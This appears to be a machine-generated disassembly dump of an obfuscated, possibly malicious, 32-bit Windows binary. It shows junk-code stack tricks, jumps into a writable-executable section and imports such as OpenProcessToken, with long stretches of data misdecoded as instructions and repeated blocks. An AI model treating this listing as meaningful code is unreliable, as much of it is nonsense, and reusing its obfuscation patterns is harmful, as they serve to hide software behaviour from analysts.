lea esp [ esp + 0x4c ]
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_514a7e
setns bl
inc ecx
pushfd
dec bl
inc bl
mov bl 0xda
inc ecx
stc
not bl
clc
sbb bl dh
xchg ebp eax
setle al
mov eax ebp
cmp dl 0x6a
not bl
not bl
mov bl 0x1
test ch dl
xchg [ esp + 0x4 ] esi
not si
cmp al 0x13
and esi 0x7ec78d0b
mov esi edi
cmp bl 0x5f
sub esi eax
pushfd
jmp rwxdata
[ edi ] [ esi ]
pushfd
pushad
mov esi [ esp + 0x2c ]
push ebx
mov [ esp ] dh
push [ esp + 0x4 ]
lea esp [ esp + 0x38 ]
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_514aff
call sub_515ab8
add [ eax ] al
inc edi
je rwxdata
and al 0x4
push 0x64616572
inc esp
jae rwxdata
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
nop
cmp esp [ eax - 0x72c46eee ]
and eax 0xc7b33eb0
je rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
je rwxdata
jae rwxdata
int1
mov al 0xee
xor edi 0xffffff99
lea esp [ 0xffffffffc7b33eb0 ]
jo __export_name_ptr_table_3(ADVAPI32:OpenProcessToken)
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
je rwxdata
popad
jo rwxdata
je rwxdata
add [ eax ] al
dec edi
jo rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
adc dl [ ecx - 0x4fda72c5 ]
mov bl 0xc7
outsb
push eax
jb rwxdata
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
cdq
arpl [ ebp + 0x73 ] sp
jae rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsd
imul esp [ ebp + 0x6e ] 0x0
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
push [ ebp - 0x8 ]
add al 0xae
jb rwxdata
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
call sub_514aff
jmp rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
